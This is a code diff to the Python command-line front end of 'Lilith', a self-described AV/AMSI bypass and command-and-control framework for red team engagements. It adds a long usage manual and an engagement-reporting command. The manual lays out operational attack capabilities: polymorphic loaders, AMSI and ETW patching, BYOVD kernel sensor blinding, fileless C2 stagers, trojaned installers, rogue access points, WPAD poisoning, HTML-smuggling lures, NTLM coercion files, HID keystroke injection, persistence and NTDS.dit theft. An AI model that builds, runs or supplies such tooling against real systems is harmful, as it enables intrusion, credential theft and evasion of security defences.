@@ -1,18 +1,263 @@
 #!/usr/bin/env python3
 """
-Usage:
-  lilith init                                    Create engagement.yaml
-  lilith build --all                             Full pipeline: runner + tools + stagers
-  lilith build --runner                          Build polymorphic C runner
-  lilith build --tool SharpUp                    Encode single tool
-  lilith build --tools                           Encode all tools from engagement.yaml
-  lilith build --stager sharpup                  Generate PS1 stager for a tool
-  lilith build --stagers                         Generate all stagers
-  lilith build --escalate GodPotato \\
-               --system-tool SharpHound          Escalation chain: potato → SYSTEM payload
-  lilith serve [--port 8443]                     HTTPS file server + callback listener
-  lilith list                                    List available tools
-  lilith check                                   Verify dependencies
+Lilith — polymorphic AV/AMSI bypass framework for authorized red team engagements.
+
+Builds a randomized C runner, encodes .NET offensive tools, generates PowerShell
+stagers, serves everything over a fake IIS HTTPS server, and records every C2
+interaction to a SQLite engagement database for purple team review.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+QUICK START
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  lilith init                       Create engagement.yaml from template
+  nano engagement.yaml              Set lhost, injection_profile, tools
+  lilith build --all                Compile runner + encode tools + generate stagers
+  lilith serve                      Start HTTPS server + C2 listener (records everything)
+  # paste 10 lines from build --stager on target
+  lilith c2 --list                  List active sessions
+  lilith c2 --session <ID>          Open interactive REPL
+  lilith engage --export md         Export full engagement report for purple team
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+COMMANDS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  init      Create engagement.yaml with all available options
+  build     Compile runner / encode tools / generate stagers / delivery payloads
+  serve     Start HTTPS payload server + C2 listener + engagement DB
+  c2        Interact with active C2 agent sessions
+  network   Network-level delivery: captive portal, WPAD poisoning, WebDAV LNK
+  patch     Trojan a legitimate PE installer with the C2 stager shellcode
+  xdr       Parse Cortex XDR agent_settings.db (exclusions, uninstall hash)
+  engage    Query and export the engagement database for purple team reporting
+  list      List all available offensive tools (✓ = binary found on disk)
+  check     Verify build dependencies
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+BUILD FLAGS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  --runner              Compile polymorphic C runner:
+                          • Each build is unique — random XOR key, symbol names,
+                            section names, Rich header, TimeDateStamp
+                          • Evasion: indirect syscalls, ntdll unhook, module stomp,
+                            ETW patch, AMSI bypass, PPID spoof, stack spoof, Ekko sleep
+                          • Outputs: runner_c.dat (XOR-encoded PE) + C2 agent shellcode
+
+  --tool NAME           Encode a single .NET tool → XOR+RC4 shellcode .enc file
+                          • Wraps in donut (CLR host + Assembly.Load in-memory)
+                          • No managed assembly ever touches disk on target
+                          Example: lilith build --tool Rubeus
+
+  --tools               Encode all tools defined in engagement.yaml at once
+
+  --stager NAME         Generate the 10-line PowerShell stager for one tool:
+                          • AMSI bypass (precompiled DLL, no csc.exe, no temp file)
+                          • Script Block Logging bypass via reflection
+                          • Invisible Unicode obfuscation on all .NET type names
+                          • XOR-obfuscated strings (URL, verb, method names)
+                          • SslStream fetch (no WinHTTP COM activation event)
+                          • Prints exact lines to paste in Evil-WinRM / cmd.exe
+                          Example: lilith build --stager Rubeus
+
+  --stagers             Generate stagers for all currently encoded tools
+
+  --all                 Full pipeline: runner → encode all tools → all stagers
+
+  --c2-stager           Generate fileless C2 agent stager:
+                          • Injects runner shellcode directly into memory — no PE on disk
+                          • Agent polls C2 every 10–30s with jitter; runs in background
+                          • Supports: shell commands, migrate, upload/download, screenshot,
+                            persist, comhijack, wnfinject, fiberexec, byovdrun
+
+  --shellcode FILE      Pack raw shellcode (.bin from msfvenom/Sliver/custom) into
+                        .enc + stager — same delivery path as .NET tools
+                          Example: lilith build --shellcode revshell.bin --name revshell
+
+  --escalate POTATO     Build a SeImpersonate → SYSTEM escalation chain:
+                          POTATO runs GodPotato/PrintSpoofer/JuicyPotato/RoguePotato,
+                          escalates to SYSTEM, then self-downloads and runs the
+                          SYSTEM-level payload via a hidden PowerShell subprocess
+    --system-tool NAME  The tool to execute as SYSTEM after escalation
+                          Example: lilith build --escalate GodPotato --system-tool Mimikatz
+
+  --byovd               Build the BYOVD kernel sensor-blinding kit:
+                          • Interactive GUI .exe + fileless shellcode .enc variant
+                          • Drivers: RTCore64, gdrv, WinRing0x64
+                          • Operations: ETW-TI disable, OB callback removal,
+                            PspNotify callback removal, DKOM hide, PPL strip, DSE patch
+    --byovd-driver PATH Kernel driver .sys path baked into byovd.enc
+                          (must be uploaded to target disk before byovdrun)
+    --byovd-ops OPS     Operations to enable at build time
+                          Default: --etwti --remove-ob-callbacks --remove-callbacks
+
+  --usb TOOL            Generate USB HID keystroke payloads for physical access:
+                          • Rubber Ducky v1/v2 (payload.txt)
+                          • Raspberry Pi Pico/CircuitPython (code.py)
+                          • DigiSpark ATtiny85 (payload_digispark.ino)
+                          • Plugs in, opens PowerShell, types stager, exits (~9–17s)
+    --usb-device TYPE   duck | pico | digispark | all  (default: all)
+    --usb-boot-delay MS USB enumeration + HID driver wait in ms  (default: 2000)
+    --usb-out DIR       Output directory  (default: <workspace>/usb/)
+
+  --ble [TOOL]          Generate BLE HID payload for wireless physical access:
+                          • Bruce firmware: DuckyScript → copy to SD at /BadBLE/
+                          • M5StickC Plus2: Arduino sketch → compile + flash
+                          • Range ~10m, one-time pairing, button-triggered injection
+                          • Bare --ble defaults to C2 agent stager
+    --ble-device TYPE   m5stick | bruce | all  (default: m5stick)
+    --ble-name NAME     BLE device name shown on pairing dialog
+                          (default: Apple Wireless Keyboard)
+    --ble-out DIR       Output directory  (default: <workspace>/ble/)
+
+  --android-ble         Generate BLE HID payload targeting Android devices
+  --android-payload     Generate Android server-side files: APK lure page + Termux stager
+
+  --smuggle [TOOL]      HTML smuggling → ISO → LNK delivery chain:
+                          • Browser downloads ISO via HTML blob URL (no server request)
+                          • ISO auto-mounts; LNK visible in Explorer; one double-click fires
+                          • Bare --smuggle defaults to C2 agent stager
+    --smuggle-lure THEME Lure page theme: update | invoice | doc | setup
+    --smuggle-lnk NAME  LNK display name inside ISO
+    --smuggle-iso NAME  ISO filename shown in browser download bar
+
+  --ntlm-trigger        Generate NTLM coercion trigger files:
+                          • .url (Internet Shortcut), .scf (Shell Command File),
+                            .searchConnector-ms (Search Connector)
+                          • Auto-authenticate to attacker SMB on folder browse/open
+                          • Feed captures to hashcat/Responder for NTLM relay
+    --ntlm-out DIR      Output directory  (default: <workspace>/ntlm_trigger/)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+C2 FLAGS  (lilith c2 ...)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  --list                List active sessions (ID, host, pending tasks, last seen)
+  --session ID          Session to interact with
+                          Without other flags: opens interactive REPL
+  --cmd CMD             One-shot command — push task, wait for result, print, exit
+  --timeout SEC         Result wait timeout in seconds  (default: 50)
+  --migrate [PROC]      Inject agent into another process via priority pool:
+                          svchost → RuntimeBroker → explorer → dllhost → sihost ...
+                          Optional: specify target name, e.g. --migrate explorer.exe
+  --persist TYPE        Install persistence via active agent session:
+                          run      → HKCU Run key (fires at next user logon)
+                          schtask  → Scheduled task (fires at logon, HighestAvailable)
+                          wmi      → WMI CommandLine Consumer (fires on explorer.exe start)
+                          All embed payload as base64 -enc; no plaintext in registry/WMI
+  --kill SID            Remove a session from the server registry (use after migration)
+
+  File operations (agent must be running with download/upload/screenshot support):
+  --upload LOCAL REMOTE Stage LOCAL file on the C2 server, push upload task to agent
+                          Agent fetches the file and writes it to REMOTE path on target
+                          Example: lilith c2 --session abc --upload rtc.sys C:\\Temp\\rtc.sys
+  --download REMOTE     Pull REMOTE file from target via agent (50 MB limit)
+                          Binary data returned as _BIN_B64, decoded and saved locally
+                          Example: lilith c2 --session abc --download C:\\Windows\\NTDS\\NTDS.dit
+  --screenshot          Capture target desktop via GDI, save as BMP
+                          Example: lilith c2 --session abc --screenshot --out desktop.bmp
+  --out FILE            Output path for --download / --screenshot
+                          Default: basename of remote path, or screenshot.bmp
+
+  REPL meta-commands (inside the interactive shell):
+    !persist wmi|run|schtask   Install persistence without leaving REPL
+    !timeout <sec>             Adjust how long to wait for a task result
+    !kill                      Kill current session and exit REPL
+    exit / quit                Leave REPL (session remains alive on target)
+
+  Built-in agent directives (type directly in REPL or --cmd):
+    migrate [proc.exe]         Migrate to another process
+    pid <proc.exe>             Resolve PID of a running process
+    wnfinject <pid>            Inject via WNF subscription (no new thread object)
+    fiberexec                  Re-inject via fiber on current thread
+    comhijack <dll> <clsid>    Register COM server hijack in HKCU
+    byovdrun [/path/enc]       Fetch + inject BYOVD shellcode in-memory
+    upload <url> <dest>        Fetch raw bytes from URL, write to dest path on target
+    download <path>            Read file from target disk, return base64
+    screenshot                 Capture screen as BMP, return base64
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+NETWORK FLAGS  (lilith network ...)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  captive               Rogue WiFi AP + captive portal delivery:
+                          • hostapd creates a rogue AP with the target SSID
+                          • dnsmasq serves DHCP; all DNS → attacker IP
+                          • Captive detection triggers browser → lure page → stager
+    --iface IFACE       Wireless interface for rogue AP (e.g. wlan1)
+    --ssid SSID         SSID to advertise  (default: Corp_Guest)
+    --cap-port PORT     HTTP port for captive portal  (default: 80)
+
+  wpad                  WPAD poisoning + HTTP injection proxy:
+                          • Serves wpad.dat pointing all traffic through attacker proxy
+                          • Proxy injects inject.js into every unencrypted HTTP response
+                          • Targets browsing HTTP sites get the stager automatically
+    --pac-port PORT     Port to serve wpad.dat  (default: 80)
+    --proxy-port PORT   Injecting proxy port  (default: 8080)
+
+  webdav                WebDAV server for search-ms: LNK delivery:
+                          • Hosts a .lnk payload via a minimal PROPFIND/GET WebDAV server
+                          • Prints a search-ms: URI to deliver (email, chat, HTML href)
+                          • When target clicks URI, Explorer opens search-results view
+                            showing the LNK — one double-click fires the payload
+    --lnk-path FILE     Path to .lnk payload  (default: <workspace>/payload.lnk)
+    --lnk-name NAME     Display name shown in Explorer search results
+                          (default: Critical Update)
+    --webdav-port PORT  HTTP port for WebDAV server  (default: webdav_port in config)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+PATCH FLAGS  (lilith patch ...)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  Trojan a legitimate PE installer: shellcode executes silently in a background
+  thread while the original program runs normally. No new process spawned.
+  AddressOfEntryPoint is redirected to a PEB-walk shim; original OEP jumps back.
+
+  --target EXE          Legitimate PE to backdoor (not modified in place)
+  --output EXE          Output path for the backdoored PE
+  --sc BIN              Pre-built raw shellcode (skip donut step)
+  --section NAME        PE section name override (randomised if omitted)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+XDR FLAGS  (lilith xdr ...)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  Parse a Cortex XDR agent_settings.db (LevelDB directory pulled from target):
+    • Uninstall password hash + salt → hashcat command (mode 10900 SHA-512)
+    • DLL/PE path exclusions → drop payload there, scan bypassed
+    • Child-process chain exclusions → spawn from excluded parent
+    • Memory protection status → choose injection technique accordingly
+    • Trusted signer CNs → code-sign bypass vector
+    • Cross-references findings against Lilith capabilities
+
+  --parse DB_DIR        Path to the agent_settings.db directory
+                          Typical location on target:
+                          C:\\ProgramData\\Cyvera\\LocalSystem\\Persistence\\agent_settings.db
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ENGAGE FLAGS  (lilith engage ...)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  Queries the SQLite engagement database (auto-created by 'lilith serve').
+  Records sessions, every task dispatched, every result received, file transfers,
+  credential detections, and all C2 events — survives server restarts.
+
+  (no flags)            Print session summary table
+  --list-tasks          List all dispatched tasks with ATT&CK technique mapping
+  --session SID         Filter --list-tasks to one session
+  --tag SID LABEL       Annotate a session (hostname, username, role)
+                          Example: lilith engage --tag abc123 "WS01\\\\jsmith (DA)"
+  --add-note TID TEXT   Attach an operator note to a specific task result
+  --export json         Export complete engagement data as JSON
+  --export md           Export as Markdown report:
+                          • Executive summary (sessions, tasks, techniques)
+                          • Full task timeline with ATT&CK technique links
+                          • Collapsible output blocks for every result
+                          • Credential capture section (hashes, plaintext, Kerberos)
+                          • ATT&CK technique coverage matrix with Mitre.org links
+                          • Event log (file serves, uploads, downloads, screenshots)
+  --out FILE            Output file for --export
+                          (default: engagement_report.json / engagement_report.md)
 """
 
 import argparse
@@ -37,7 +282,7 @@ from builders.blehid   import build_ble_payload, DEVICES as BLE_DEVICES, build_a
 from builders.android  import build_android_payload
 from builders.smuggle    import build_smuggle_payload, LURE_PRESETS as SMUGGLE_LURES, load_inject_js
 from builders.ntlm_trigger import build_ntlm_triggers
-from server.https_server import start_server, get_c2_sessions, _c2_push_task, _c2_get_result
+from server.https_server import start_server, get_c2_sessions, _c2_push_task, _c2_get_result, set_engage_db
 
 
 # ── helpers ────────────────────────────────────────────────────────────────────
@@ -562,8 +807,13 @@ def _build_persist_cmd(persist_type: str, cfg: dict, ws: Workspace) -> str | Non
 
 
 def cmd_serve(args, cfg, ws):
+    from core.engage import EngagementDB
     port      = args.port      or cfg.get("http_port",   8443)
     mgmt_port = args.mgmt_port or cfg.get("mgmt_port",   8444)
+    db_path   = ws.path("engagement.db")
+    db        = EngagementDB(db_path)
+    set_engage_db(db)
+    print(f"[+] Engagement DB : {db_path}")
     start_server(
         workspace       = ws.directory,
         lhost           = "0.0.0.0",
@@ -925,6 +1175,88 @@ def cmd_network(args, cfg, ws):
         sys.exit(1)
 
 
+def cmd_engage(args, cfg, ws):
+    from core.engage import EngagementDB
+    db_path = ws.path("engagement.db")
+    if not os.path.exists(db_path):
+        print(f"[!] No engagement database found at {db_path}")
+        print(f"    Start 'lilith serve' first — the DB is created automatically on first run.")
+        return
+    db = EngagementDB(db_path)
+
+    if getattr(args, "tag", None):
+        sid, label = args.tag[0], args.tag[1]
+        note = args.note_text if getattr(args, "note_text", None) and not getattr(args, "note_task", None) else None
+        ok = db.tag_session(sid, label, note)
+        print(f"[+] Tagged session {sid} → '{label}'" if ok else f"[!] Session {sid} not found in DB")
+        return
+
+    if getattr(args, "add_note", None):
+        tid, text = args.add_note[0], args.add_note[1]
+        ok = db.add_note(tid, text)
+        print(f"[+] Note added to task {tid}" if ok else f"[!] Task {tid} not found in DB")
+        return
+
+    if getattr(args, "export", None):
+        fmt = args.export.lower()
+        out_path = getattr(args, "out", None)
+        if fmt == "json":
+            content = json.dumps(db.export_json(), indent=2)
+            ext = ".json"
+        elif fmt in ("md", "markdown"):
+            content = db.export_markdown()
+            ext = ".md"
+        else:
+            print(f"[!] Unknown export format '{fmt}' — use: json | md")
+            return
+        if out_path:
+            with open(out_path, "w", encoding="utf-8") as f:
+                f.write(content)
+            print(f"[+] Exported ({fmt}) → {out_path}")
+        else:
+            default = f"engagement_report{ext}"
+            with open(default, "w", encoding="utf-8") as f:
+                f.write(content)
+            print(f"[+] Exported ({fmt}) → {default}")
+        return
+
+    # Default: print summary tables
+    sessions = db.get_sessions()
+    if not sessions:
+        print("[*] No sessions recorded yet.")
+        return
+
+    sid_filter = getattr(args, "session", None)
+
+    if getattr(args, "list_tasks", False):
+        tasks = db.get_tasks(session_id=sid_filter)
+        if not tasks:
+            print("[*] No tasks recorded.")
+            return
+        print(f"\n{'Task ID':<18} {'Session':<18} {'Time':<20} {'ATT&CK':<15} {'Creds':<6}  Command")
+        print("─" * 110)
+        for t in tasks:
+            attack = t.get("technique_id") or "—"
+            cred   = "YES" if t.get("has_creds") else "—"
+            time_  = (t.get("dispatched_at") or "")
+            cmd_s  = (t.get("command") or "")[:60]
+            print(f"{t['id']:<18} {t['session_id']:<18} {time_:<20} {attack:<15} {cred:<6}  {cmd_s}")
+        print()
+        return
+
+    # Default: session list
+    print(f"\n{'Session ID':<18} {'Host':<16} {'Registered':<20} {'Label':<20} {'Tasks':<6} {'Cred tasks'}")
+    print("─" * 100)
+    for s in sessions:
+        label = s.get("label") or "—"
+        print(f"{s['id']:<18} {s['host']:<16} {s['registered_at']:<20} {label:<20} {s.get('task_count',0):<6} {s.get('cred_tasks',0)}")
+    print()
+
+    creds = db.get_cred_results()
+    if creds:
+        print(f"[!] {len(creds)} task(s) with credential captures — run: lilith engage --export md")
+
+
 def cmd_xdr(args, cfg, ws):
     from builders.cortex_xdr import parse_and_report
     parse_and_report(args.db_dir)
@@ -1149,6 +1481,21 @@ def main():
     xdr_p.add_argument("--parse", metavar="DB_DIR", dest="db_dir", required=True,
                        help="Path to agent_settings.db directory (e.g. pulled from target via 'download')")
 
+    eng_p = sub.add_parser("engage",
+                            help="Query / export the engagement database for purple team reporting")
+    eng_p.add_argument("--list-tasks",  action="store_true", dest="list_tasks",
+                       help="List all dispatched tasks with ATT&CK technique mapping")
+    eng_p.add_argument("--session",     metavar="SID",
+                       help="Filter --list-tasks to a specific session ID")
+    eng_p.add_argument("--tag",         metavar=("SID", "LABEL"), nargs=2,
+                       help="Annotate a session with a label (hostname, user, role)")
+    eng_p.add_argument("--add-note",    metavar=("TASK_ID", "TEXT"), nargs=2, dest="add_note",
+                       help="Attach an operator note to a specific task result")
+    eng_p.add_argument("--export",      metavar="FORMAT",
+                       help="Export engagement data: json | md (Markdown with ATT&CK mapping)")
+    eng_p.add_argument("--out",         metavar="FILE",
+                       help="Output file for --export (default: engagement_report.json / .md)")
+
     args = parser.parse_args()
     if not args.command:
         parser.print_help()
@@ -1167,6 +1514,7 @@ def main():
         "patch":   cmd_patch,
         "network": cmd_network,
         "xdr":     cmd_xdr,
+        "engage":  cmd_engage,
     }
     dispatch[args.command](args, cfg, ws)
 
